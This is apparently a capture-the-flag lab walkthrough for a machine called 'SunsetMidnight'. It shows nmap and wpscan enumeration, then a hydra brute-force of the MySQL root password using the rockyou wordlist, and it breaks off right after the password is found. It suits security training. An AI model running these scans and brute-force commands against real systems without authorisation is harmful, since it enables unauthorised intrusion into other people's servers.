First enumeration with nmap

```
# Nmap 7.93 scan initiated Mon Apr  3 10:41:37 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80,3306 -Pn 192.168.86.88
Nmap scan report for 192.168.86.88
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9cfe0b8b8d15e7727e3c23e58655512d (RSA)
|   256 feebef5d40e706679b6367f8d97ed3e2 (ECDSA)
|_  256 3583682c338bb46c2421200d52edcd16 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Did not follow redirect to http://sunset-midnight/
|_http-server-header: Apache/2.4.38 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 17
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolNew, Support41Auth, ODBCClient, Speaks41ProtocolOld, SupportsCompression, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, FoundRows, SupportsTransactions, LongColumnFlag, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: OnZW)c945Md0axY5=n7e
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  3 10:41:57 2023 -- 1 IP address (1 host up) scanned in 20.00 seconds
```
add `sunset-midnight` to `/etc/hosts` file.

![image](https://user-images.githubusercontent.com/87468669/229475426-9059fc0f-0daf-46c2-8c65-d16323368a04.png)

notice a web server running on port 80, opening it on a browser redirected us to a vhost `sunset-midnight` and as we can see it is running a wordpress cms. Let's enumerate further using `wpscan`.

```
wpscan --url http://sunset-midnight/ -e p,t,u 
```
![image](https://user-images.githubusercontent.com/87468669/229525720-679eabac-9ff4-490a-86b3-09a57ebc028c.png)

using wpscan to enumerate plugins, themes and user we can see the available plugin `simply-poll-master` and user `admin`. searching for exploits for this plugin found none. let's move to the next port `3306` mysql server.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/SunsetMidnight]
└─$ mysql -h sunset-midnight -u root
ERROR 1045 (28000): Access denied for user 'root'@'192.168.49.139' (using password: NO)
```
tried loggin in mysql as user root without password, failed. let's try bruteforce mysql password.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/SunsetMidnight]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.139.88 mysql
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-03 14:41:01
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 7819918 login tries (l:1/p:7819918), ~1954980 tries per task
[DATA] attacking mysql://192.168.139.88:3306/
[3306][mysql] host: 192.168.139.88   login: root   password: robert
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-03 14:41:44
```
boom we got the password for mysql server. let's login an see what we can do.







